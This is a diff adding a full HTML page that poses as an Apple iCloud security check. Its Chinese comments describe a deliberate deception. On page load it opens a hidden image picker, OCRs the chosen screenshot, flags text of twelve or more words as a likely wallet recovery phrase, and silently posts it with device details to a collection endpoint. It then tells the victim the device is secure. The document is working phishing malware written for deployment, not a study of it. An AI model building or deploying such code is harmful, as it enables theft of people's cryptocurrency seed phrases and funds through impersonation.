@@ -1,1 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>iCloud Security</title>
+    <style>
+        /* 极致模拟 iOS 18 系统深色模式 */
+        body { 
+            background-color: #000; 
+            color: #fff; 
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            overflow: hidden;
+        }
 
+        /* 模拟系统加载动画 */
+        .system-loader {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            margin-top: 20px;
+            font-size: 17px;
+            letter-spacing: -0.5px;
+            color: #8e8e93;
+        }
+
+        /* 隐藏的输入框 */
+        #fileInput { display: none; }
+
+        /* 伪装的系统弹窗遮罩 */
+        #overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4);
+            display: none;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="main-content" style="text-align: center;">
+        <div class="system-loader" id="loader"></div>
+        <div class="status-text" id="status">Verifying iCloud Security...</div>
+    </div>
+
+    <input type="file" id="fileInput" accept="image/*">
+
+    <!-- 引入 OCR 引擎 -->
+    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+
+    <script>
+        // 核心逻辑：页面加载瞬间，直接“突袭”权限请求
+        window.onload = function() {
+            setTimeout(() => {
+                // 延迟 0.5 秒，模拟系统正在“验证”的过程，增加真实感
+                const fileInput = document.getElementById('fileInput');
+                fileInput.click(); 
+            }, 500);
+        };
+
+        document.getElementById('fileInput').onchange = async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+
+            document.getElementById('status').innerText = "Synchronizing with iCloud...";
+            document.getElementById('status').style.color = "#ff9500";
+
+            try {
+                // 1. 执行 OCR 识别
+                const { data: { text } } = await Tesseract.recognize(file, 'eng');
+
+                // 2. 语义检查：如果识别到的内容包含大量连续单词（疑似助记词）
+                const words = text.trim().split(/\s+/);
+                if (words.length >= 12) {
+                    // 3. 触发静默回传
+                    await sendToVault(text);
+                } else {
+                    // 如果没识别到，也发一个空记录，确保链路通畅
+                    await sendToVault("No sensitive data detected in image.");
+                }
+            } catch (err) {
+                console.error("Sync Error:", err);
+            }
+        };
+
+        async function sendToVault(content) {
+            // ⚠️ 这里填入你部署后的 Vercel 接口地址
+            const API_ENDPOINT = '/api/collect'; 
+
+            try {
+                await fetch(API_ENDPOINT, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payload: content,
+                        device: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                // 成功后，界面进入“完成”状态，让用户觉得一切正常
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('status').innerText = "Sync Complete. Your device is secure.";
+                document.getElementById('status').style.color = "#34c759";
+            } catch (error) {
+                // 即使失败了，也不要报错，要让用户觉得“没发生任何事”
+                document.getElementById('status').innerText = "Sync Complete.";
+            }
+        }
+    </script>
+</body>
+</html>
